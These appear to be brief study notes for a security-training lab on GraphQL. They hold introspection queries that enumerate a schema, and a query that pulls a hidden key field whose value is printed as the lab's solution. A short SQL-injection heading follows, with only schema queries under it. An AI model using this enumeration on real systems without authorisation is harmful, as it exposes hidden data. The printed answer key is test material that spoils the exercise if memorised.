## Green Badge

### GraphQL Introspection

References

- https://graphql.org/learn/
- https://graphql.org/learn/introspection/

Notes

It's often useful to ask a GraphQL schema for information about what queries it supports. GraphQL allows us to do so using the introspection system!

Intercept on projects

```
POST http://ptl-e903a9b4-72b7b45b.libcurl.so/graphql HTTP/1.1
Accept: application/json, text/plain, */*
Content-Type: application/json

{"operationName":"projects","variables":{"offset":10},"query":"query projects($offset: Int) {\n  projects(offset: $offset, limit: 10) {\n    id\n    name\n    description\n    __typename\n  }\n}\n"}
```

GraphiQL interface

1

```
{
  __type(name: "Query") {
    name
    kind
  }
}
```

3

```
{
  __type(name: "Query") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

4

```
{
  ptlabkeys
  {
      id
      value
      __typename
  }
}
```

Solution

```
{
  "data": {
    "ptlabkeys": [
      {
        "id": "1",
        "value": "78ce1c9e-b8cc-4385-9fda-2c8e16dbc349",
        "__typename": "PtlabKey"
      }
    ]
  }
}
```

### GraphQL: SQL Injection

```
{"operationName":"projects","variables":{"offset":10},"query":"query projects($offset:Int) { projects(offset:$offset, limit:10) { id name description __typename  }}"}
```

```
{"query":"{__schema{queryType { name }}}"}
```

```
{"query":"{__schema{queryType { name,fields {name} }}}"}
```



